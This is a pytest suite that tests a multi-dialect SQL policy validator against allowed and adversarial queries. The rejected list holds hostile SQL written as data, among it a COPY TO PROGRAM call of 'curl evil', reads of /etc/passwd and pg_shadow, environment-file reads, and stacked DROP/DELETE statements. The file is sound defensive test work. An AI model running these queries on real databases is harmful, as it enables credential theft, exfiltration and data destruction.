"""Spike 1 (plan §3, Week 0): adversarial SQL policy suite. Every reject case must fail closed."""

import pytest

from odn.platform.policy import SqlPolicy

BQ = SqlPolicy(
    dialect="bigquery",
    allowed_objects=frozenset({"proj.sales.*", "proj.ref.zip_codes"}),
    default_namespace=("proj", "sales"),
)
PG = SqlPolicy(
    dialect="postgres",
    allowed_objects=frozenset({"sales.*"}),
    default_namespace=("sales",),
)
DUCK = SqlPolicy(dialect="duckdb", allowed_objects=frozenset({"q_1", "q_2"}))
MYSQL = SqlPolicy(
    dialect="mysql", allowed_objects=frozenset({"Sales.Orders", "Reporting.*"}), default_namespace=("Sales",),
)
ORACLE = SqlPolicy(
    dialect="oracle", allowed_objects=frozenset({"HR.ORDERS", "REPORTING.Orders"}), default_namespace=("HR",),
)

POLICIES = {"bq": BQ, "pg": PG, "duck": DUCK, "mysql": MYSQL, "oracle": ORACLE}

ALLOWED = [
    ("oracle", "SELECT COUNT(*) FROM hr.orders"),
    ("oracle", 'SELECT * FROM "REPORTING"."Orders" FETCH FIRST 10 ROWS ONLY'),
    ("oracle", "WITH x AS (SELECT * FROM orders) SELECT SUM(amount) FROM x"),
    ("oracle", "SELECT ROW_NUMBER() OVER (ORDER BY amount) FROM orders"),
    ("mysql", "SELECT COUNT(*) FROM `Sales`.`Orders`"),
    ("mysql", "SELECT SUM(amount) FROM Orders"),
    ("mysql", "WITH t AS (SELECT * FROM Orders) SELECT * FROM t"),
    ("mysql", "SELECT * FROM Sales.Orders o JOIN Reporting.Totals t ON o.id = t.id"),
    ("bq", "SELECT * FROM proj.sales.orders"),
    ("bq", "SELECT * FROM `proj.sales.orders`"),
    ("bq", "SELECT region, SUM(amount) FROM sales.orders GROUP BY region"),
    ("bq", "SELECT o.*, z.state FROM orders o JOIN proj.ref.zip_codes z ON o.zip = z.zip"),
    ("bq", "WITH t AS (SELECT * FROM orders) SELECT COUNT(*) FROM t"),
    ("bq", "SELECT * FROM proj.sales.events_* WHERE _TABLE_SUFFIX > '2024'"),
    ("bq", "SELECT x FROM orders, UNNEST(items) AS x"),
    ("bq", "SELECT * FROM orders WHERE id IN (SELECT id FROM customers)"),
    ("bq", "SELECT 1 UNION ALL SELECT 2"),
    ("bq", "SELECT 1; "),
    ("pg", "SELECT * FROM sales.orders LIMIT 10"),
    ("pg", "SELECT * FROM orders o JOIN customers c USING (customer_id)"),
    ("pg", "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * FROM r"),
    ("pg", "SELECT region, ROW_NUMBER() OVER (PARTITION BY region ORDER BY amount) FROM orders"),
    ("duck", "SELECT region, COUNT(*) FROM q_1 GROUP BY ALL"),
    ("duck", "SELECT * FROM q_1 JOIN q_2 USING (id)"),
]

REJECTED = [
    ("oracle", 'SELECT * FROM HR."orders"'),
    ("oracle", "SELECT * FROM REPORTING.Orders"),
    ("oracle", "SELECT * FROM HR.ORDERS@remote"),
    ("oracle", "SELECT * FROM SYS.ALL_USERS"),
    ("oracle", "SELECT 1 FROM DUAL"),
    ("oracle", "SELECT seq.NEXTVAL FROM orders"),
    ("oracle", "SELECT UTL_HTTP.REQUEST('https://example.com') FROM orders"),
    ("oracle", "SELECT custom_function(1) FROM orders"),
    ("oracle", "SELECT * FROM orders FOR UPDATE"),
    ("oracle", "SELECT /*+ PARALLEL(100) */ * FROM orders"),
    ("oracle", "SELECT :password FROM orders"),
    ("oracle", "SELECT * FROM orders; DELETE FROM orders"),
    ("oracle", "BEGIN DBMS_LOCK.SLEEP(5); END;"),
    ("mysql", "SELECT * FROM sales.orders"),
    ("mysql", "SELECT * FROM `Sales.Orders`"),
    ("mysql", "SELECT * FROM mysql.user"),
    ("mysql", "SELECT * FROM performance_schema.threads"),
    ("mysql", "SELECT * FROM sys.session"),
    ("mysql", "SELECT SLEEP(1)"),
    ("mysql", "SELECT GET_LOCK('x', 1)"),
    ("mysql", "SELECT BENCHMARK(10000, 1)"),
    ("mysql", "SELECT LOAD_FILE('/etc/passwd')"),
    ("mysql", "SELECT Reporting.custom_function(1)"),
    ("mysql", "SELECT custom_function(1)"),
    ("mysql", "SELECT @x := 1"),
    ("mysql", "SELECT @@version"),
    ("mysql", "SELECT /*!50000 SLEEP(1) */ 1"),
    ("mysql", "SELECT /*+ MAX_EXECUTION_TIME(0) */ * FROM Orders"),
    ("mysql", "SELECT /*+ SET_VAR(sql_mode='ANSI_QUOTES') */ * FROM Orders"),
    ("mysql", "SELECT * FROM Orders FOR UPDATE"),
    ("mysql", "SELECT * FROM Orders LOCK IN SHARE MODE"),
    ("mysql", "SELECT * FROM Orders INTO OUTFILE '/tmp/x'"),
    ("mysql", "SELECT 1; DELETE FROM Orders"),
    # DML / DDL
    ("bq", "INSERT INTO proj.sales.orders VALUES (1)"),
    ("bq", "UPDATE proj.sales.orders SET amount = 0 WHERE TRUE"),
    ("bq", "DELETE FROM proj.sales.orders WHERE TRUE"),
    ("bq", "MERGE proj.sales.orders t USING proj.sales.x s ON t.id = s.id WHEN MATCHED THEN DELETE"),
    ("bq", "CREATE TABLE proj.sales.copy AS SELECT * FROM proj.sales.orders"),
    ("bq", "DROP TABLE proj.sales.orders"),
    ("bq", "ALTER TABLE proj.sales.orders ADD COLUMN x INT64"),
    ("bq", "TRUNCATE TABLE proj.sales.orders"),
    ("pg", "CREATE TEMP TABLE t AS SELECT 1"),
    ("pg", "GRANT SELECT ON sales.orders TO public"),
    # Data-modifying CTEs / SELECT INTO / locking
    ("pg", "WITH d AS (DELETE FROM sales.orders RETURNING *) SELECT * FROM d"),
    ("pg", "WITH u AS (UPDATE sales.orders SET amount = 0 RETURNING *) SELECT 1"),
    ("pg", "WITH i AS (INSERT INTO sales.orders VALUES (1) RETURNING *) SELECT * FROM i"),
    ("pg", "SELECT * INTO sales.stolen FROM sales.orders"),
    ("pg", "SELECT * FROM sales.orders FOR UPDATE"),
    ("pg", "SELECT * FROM sales.orders FOR SHARE"),
    # Multi-statement / scripting / dynamic SQL
    ("bq", "SELECT 1; DROP TABLE proj.sales.orders"),
    ("bq", "SELECT 1; SELECT 2"),
    ("bq", "EXECUTE IMMEDIATE 'DROP TABLE proj.sales.orders'"),
    ("bq", "DECLARE x INT64; SELECT 1"),
    ("bq", "BEGIN SELECT 1; END"),
    ("bq", "CALL proj.sales.proc()"),
    ("pg", "DO $$ BEGIN DELETE FROM sales.orders; END $$"),
    ("pg", "CALL sales.proc()"),
    ("pg", "SET search_path = pg_catalog"),
    ("pg", "BEGIN; DELETE FROM sales.orders; COMMIT"),
    ("pg", "COPY (SELECT * FROM sales.orders) TO PROGRAM 'curl evil'"),
    ("pg", "PREPARE p AS DELETE FROM sales.orders"),
    # System catalog scrapes
    ("bq", "SELECT * FROM proj.sales.INFORMATION_SCHEMA.TABLES"),
    ("bq", "SELECT * FROM `region-us`.INFORMATION_SCHEMA.JOBS"),
    ("bq", "SELECT * FROM `region-us.INFORMATION_SCHEMA.JOBS_BY_PROJECT`"),
    ("pg", "SELECT * FROM information_schema.tables"),
    ("pg", "SELECT * FROM pg_catalog.pg_shadow"),
    ("pg", "SELECT usename, passwd FROM pg_shadow"),
    ("pg", "SELECT * FROM pg_user"),
    ("pg", "SELECT * FROM sales.orders WHERE EXISTS (SELECT 1 FROM pg_roles)"),
    # Unapproved objects / cross-project
    ("bq", "SELECT * FROM other_proj.sales.orders"),
    ("bq", "SELECT * FROM proj.hr.salaries"),
    ("bq", "SELECT * FROM proj.ref.other_table"),
    ("bq", "SELECT * FROM proj.sales.orders o JOIN other_proj.hr.salaries s ON o.id = s.id"),
    ("bq", "SELECT (SELECT MAX(salary) FROM proj.hr.salaries) FROM proj.sales.orders"),
    ("bq", "SELECT * FROM proj.sales.orders UNION ALL SELECT * FROM proj.hr.salaries"),
    ("pg", "SELECT * FROM hr.salaries"),
    ("pg", "SELECT * FROM otherdb.sales.orders"),
    # CTE name shadowing must not hide a real table in another scope
    ("pg", "SELECT * FROM (WITH salaries AS (SELECT 1) SELECT * FROM salaries) a, hr.salaries"),
    ("bq", "SELECT * FROM (WITH salaries AS (SELECT 1) SELECT * FROM salaries) a, proj.hr.salaries"),
    # Dangerous functions / table functions
    ("bq", "SELECT * FROM EXTERNAL_QUERY('proj.us.conn', 'SELECT * FROM users')"),
    ("pg", "SELECT pg_read_file('/etc/passwd')"),
    ("pg", "SELECT pg_sleep(3600)"),
    ("pg", "SELECT query_to_xml('DELETE FROM sales.orders RETURNING *', true, true, '')"),
    ("pg", "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)"),
    ("pg", "SELECT set_config('search_path', 'pg_catalog', false)"),
    ("pg", "SELECT nextval('sales.orders_id_seq')"),
    ("pg", "SELECT lo_import('/etc/passwd')"),
    ("pg", "SELECT current_setting('data_directory')"),
    # DuckDB worker sandbox escapes
    ("duck", "SELECT * FROM '/etc/passwd'"),
    ("duck", "SELECT * FROM 'gs://other-tenant/x.parquet'"),
    ("duck", "SELECT * FROM read_csv('/etc/passwd')"),
    ("duck", "SELECT * FROM read_parquet('s3://bucket/x.parquet')"),
    ("duck", "SELECT * FROM read_text('/proc/self/environ')"),
    ("duck", "SELECT * FROM glob('/**')"),
    ("duck", "SELECT getenv('HOME')"),
    ("duck", "SELECT * FROM duckdb_settings()"),
    ("duck", "ATTACH '/tmp/x.db' AS x"),
    ("duck", "INSTALL httpfs"),
    ("duck", "LOAD httpfs"),
    ("duck", "PRAGMA database_list"),
    ("duck", "COPY q_1 TO '/tmp/out.csv'"),
    ("duck", "SET enable_external_access = true"),
    ("duck", "SELECT * FROM q_3"),
    # Malformed / empty / oversized
    ("bq", ""),
    ("bq", "   "),
    ("bq", "-- just a comment"),
    ("bq", "SELECT 1; -- ; DROP TABLE x"),
    ("bq", "SELEC * FROM proj.sales.orders"),
    ("pg", "SELECT * FROM sales.orders WHERE ("),
    ("pg", "SELECT 1 " + "+ 1 " * 30_000),
]


@pytest.mark.parametrize(("policy", "sql"), ALLOWED)
def test_allowed(policy: str, sql: str) -> None:
    decision = POLICIES[policy].validate(sql)
    assert decision.allowed, decision.reason


@pytest.mark.parametrize(("policy", "sql"), REJECTED)
def test_rejected(policy: str, sql: str) -> None:
    decision = POLICIES[policy].validate(sql)
    assert not decision.allowed
    assert decision.reason


def test_mysql_allowlist_and_catalog_paths_preserve_exact_case():
    assert MYSQL.validate("SELECT * FROM Orders").tables == ("Sales.Orders",)
    assert MYSQL.allows_object(("Sales", "Orders"))
    assert not MYSQL.allows_object(("Sales", "orders"))
    assert MYSQL.allows_container(("Reporting",))
    assert not MYSQL.allows_container(("reporting",))
    wildcard = SqlPolicy(dialect="mysql", allowed_objects=frozenset({"*.*"}))
    for database in ("mysql", "sys", "information_schema", "performance_schema"):
        assert not wildcard.allows_container((database,))
        assert not wildcard.allows_object((database, "users"))
        assert not wildcard.validate(f"SELECT * FROM {database}.users").allowed


def test_oracle_quoted_case_and_system_restrictions():
    assert ORACLE.validate("SELECT * FROM hr.orders").tables == ("HR.ORDERS",)
    assert ORACLE.allows_object(("REPORTING", "Orders"))
    assert not ORACLE.allows_object(("REPORTING", "ORDERS"))
    wildcard = SqlPolicy("oracle", frozenset({"*.*"}), ("HR",))
    for schema in ("SYS", "SYSTEM", "XDB"):
        assert not wildcard.allows_container((schema,))
        assert not wildcard.allows_object((schema, "T"))
        assert not wildcard.validate(f"SELECT * FROM {schema}.T").allowed


def test_adversarial_suite_size() -> None:
    assert len(REJECTED) >= 50


def test_reports_referenced_tables() -> None:
    decision = BQ.validate("SELECT * FROM orders o JOIN proj.ref.zip_codes z ON o.zip = z.zip")
    assert decision.tables == ("proj.sales.orders", "proj.ref.zip_codes")


def test_unqualified_without_defaults_rejected() -> None:
    policy = SqlPolicy(dialect="bigquery", allowed_objects=frozenset({"proj.sales.*"}))
    assert not policy.validate("SELECT * FROM orders").allowed
